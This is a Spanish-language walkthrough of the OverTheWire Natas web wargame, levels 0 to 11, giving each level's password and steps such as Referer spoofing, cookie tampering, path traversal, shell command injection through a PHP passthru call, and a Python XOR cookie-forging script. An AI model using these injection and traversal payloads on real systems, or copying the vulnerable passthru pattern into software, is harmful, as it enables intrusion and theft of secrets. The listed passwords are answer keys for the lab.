# Table of Contents

1.  [Levels](#orgcd1350c)
    1.  [Level 0](#orgdd114af)
        1.  [Contraseña](#org39ea149)
    2.  [Level 0 -> 1](#org15321a0)
        1.  [Contraseña](#orgc6d35d2)
    3.  [Level 1 -> 2](#org6c1591d)
        1.  [Contraseña](#orgf1def65)
    4.  [Level 2 -> 3](#org3c009b3)
        1.  [Contraseña](#org4b46254)
    5.  [Level 3 -> 4](#orga46bc0c)
        1.  [Contraseña](#org14e9bd8)
    6.  [Level 4 -> 5](#orgf68efa9)
        1.  [Contraseña](#org1e4a5b7)
    7.  [Level 5 -> 6](#org898ecaf)
        1.  [Contraseña](#orgcd3f1ae)
    8.  [Level 6 -> 7](#org82cae51)
        1.  [Contraseña](#org63971ee)
    9.  [Level 7 -> 8](#org21d737d)
        1.  [Contraseña](#orgf9f69c1)
    10. [Level 8 -> 9](#org81a265c)
        1.  [Contraseña](#org4c45c74)
    11. [Level 9 -> 10](#org20b3b54)
        1.  [Contraseña](#orgb8925c4)
    12. [Level 10 -> 11](#orga0f2d51)
        1.  [Contraseña](#orgc2ded4a)


<a id="orgcd1350c"></a>

# Levels

-   Las contraseñas son para acceder al siguiente nivel. Es decir, en Level 1 -> 2, estás hayando la contraseña para natas3


<a id="orgdd114af"></a>

## Level 0

1.  Ingresa a la página y fíjate en el source


<a id="org39ea149"></a>

### Contraseña

    0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq


<a id="org15321a0"></a>

## Level 0 -> 1

1.  De forma similar, está en el source code visible en el panel de desarrollador


<a id="orgc6d35d2"></a>

### Contraseña

    TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI


<a id="org6c1591d"></a>

## Level 1 -> 2

1.  El código fuente muestra que accede a `files/pixel.png`.
2.  Se puede acceder al directorio files/
3.  En el directorio files/ se tiene users.txt con la contraseña a Natas3


<a id="orgf1def65"></a>

### Contraseña

    3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH


<a id="org3c009b3"></a>

## Level 2 -> 3

1.  Lo clásico, revisa `robots.txt`
2.  En `robots.txt` hay un directorio excluido, `s3cr3t`
3.  En el directorio excluido está la contraseña


<a id="org4b46254"></a>

### Contraseña

    QryZXc2e0zahULdHrtHxzyYkj59kUxLQ


<a id="orga46bc0c"></a>

## Level 3 -> 4

1.  Accediendo al sitio, te muestra el siguiente mensaje:
    
        Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
2.  Me da la idea de `Referer`
3.  Sip sí era `Referer`. Solo escríbelo en Postman


<a id="org14e9bd8"></a>

### Contraseña

    0n35PkggAPm2zbEpOU802c0x0Msn1ToK


<a id="orgf68efa9"></a>

## Level 4 -> 5

1.  Ingresando al nivel te muestra el mensaje
    
        Access disallowed. You are not logged in
2.  El sitio tiene cookies. Solo revisando el almacenamiento en la consola y cambiando su valor a 1 te permite ingresar.


<a id="org1e4a5b7"></a>

### Contraseña

    0RoJwHdSKWFTYR5WuiAewauSuNaBXned


<a id="org898ecaf"></a>

## Level 5 -> 6

1.  Viendo el source, se ve que se accede a un secreto en `includes/secret.inc`
2.  Simplemente se accede a este mediante el URL y se obtiene el secreto
3.  Enviando el secreto, se tiene la contraseña


<a id="orgcd3f1ae"></a>

### Contraseña

    bmg8SvU1LizuWjx3y7xkNERkHxGre0GS


<a id="org82cae51"></a>

## Level 6 -> 7

1.  Ingresando se tienen dos pestañas, home y about
2.  Se acceden mediante queries PHP
    
        http://natas7.natas.labs.overthewire.org/index.php?page=home
3.  Simplemente accedemos a la contraseña
    
        http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8


<a id="org63971ee"></a>

### Contraseña

    xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q


<a id="org21d737d"></a>

## Level 7 -> 8

1.  Otro input secret
2.  El secreto está en texto plano en el sitio, pero codificado
    
        <?
        $encodedSecret = "3d3d516343746d4d6d6c315669563362";
        
        function encodeSecret($secret) {
            return bin2hex(strrev(base64_encode($secret)));
        }
        
        if(array_key_exists("submit", $_POST)) {
            if(encodeSecret($_POST['secret']) == $encodedSecret) {
            print "Access granted. The password for natas9 is <censored>";
            } else {
            print "Wrong secret";
            }
        }
        ?>
3.  Hagamo un script chiquito
    
        import base64
        
        encoded_secret = "3d3d516343746d4d6d6c315669563362"
        
        def decode_secret(secret):
           bytes_from_hex = bytes.fromhex(secret) 
           decoded_string = bytes_from_hex.decode()
           inverted_string = decoded_string[::-1]
           decoded_final = base64.b64decode(inverted_string)
           return decoded_final.decode()
        
        print(decode_secret(encoded_secret))


<a id="orgf9f69c1"></a>

### Contraseña

ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t


<a id="org81a265c"></a>

## Level 8 -> 9

1.  El código es algo extraño, te permite buscar palabras en un diccionario

    $key = "";
    
    if(array_key_exists("needle", $_REQUEST)) {
        $key = $_REQUEST["needle"];
    }
    
    if($key != "") {
        passthru("grep -i $key dictionary.txt");
    }

1.  Entonces `$key` se pasa como parámetro a un comando shell -> RCE

    ; ls ../../../../etc/natas_webpass #
    ; cat ../../../../etc/natas_webpass/natas10 #


<a id="org4c45c74"></a>

### Contraseña

t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu


<a id="org20b3b54"></a>

## Level 9 -> 10

1.  Mismo que el anterior, pero filtra caracteres
    
        if($key != "") {
            if(preg_match('/[;|&]/',$key)) {
                print "Input contains an illegal character!";
            } else {
                passthru("grep -i $key dictionary.txt");
            }
        }
2.  Está filtrando `;`, `|` y `&`.
3.  Ok bueno tan solo nos aprovechamos de cómo funciona grep.
4.  Pasamos un argumento para que lo lea en `/etc/natas_webpass/natas1` y en `dictionary.txt`

    a ../../../../etc/natas_webpass/natas11

Todo el comando será

    grep -i a ../../../../etc/natas_webpass/natas11 dictionary.txt


<a id="orgb8925c4"></a>

### Contraseña

UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk


<a id="orga0f2d51"></a>

## Level 10 -> 11

1.  El código vulnerable permite generar cookies de forma sencilla para descifrar la clave.
2.  Primero, se crea una cookie sin clave
    
        <?php
        $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
        echo base64_encode(json_encode($defaultdata));
        ?>
    
        eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=
3.  XOR entre la cookie sin clave y con la clave.

    import base64
    import json
    import itertools
    
    with_key = base64.b64decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=")
    no_key = base64.b64decode("eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=")
    key = bytes([_a ^ _b for _a, _b in zip(with_key, no_key)])[:4]
    
    cookie = {"showpassword": "yes", "bgcolor":"#ffffff"}
    key_cycle = itertools.cycle(key)
    encrypted_json = bytes([_a ^ next(key_cycle) for _a in json.dumps(cookie).encode()])
    return base64.b64encode(encrypted_json).decode()

1.  Clave: eDWo


<a id="orgc2ded4a"></a>

### Contraseña

yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

